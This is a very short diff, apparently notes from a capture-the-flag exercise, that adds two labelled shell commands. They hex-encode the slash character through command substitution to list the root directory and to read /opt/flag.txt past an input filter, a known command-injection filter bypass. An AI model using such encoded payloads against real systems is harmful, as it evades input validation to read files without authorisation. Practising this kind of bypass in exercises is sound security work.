@@ -1,0 +1,3 @@
+ls /: ls $(echo -e "\x2f")
+read flag: cat $(echo -e "\x2f")opt$(echo -e "\x2f")flag.txt
+
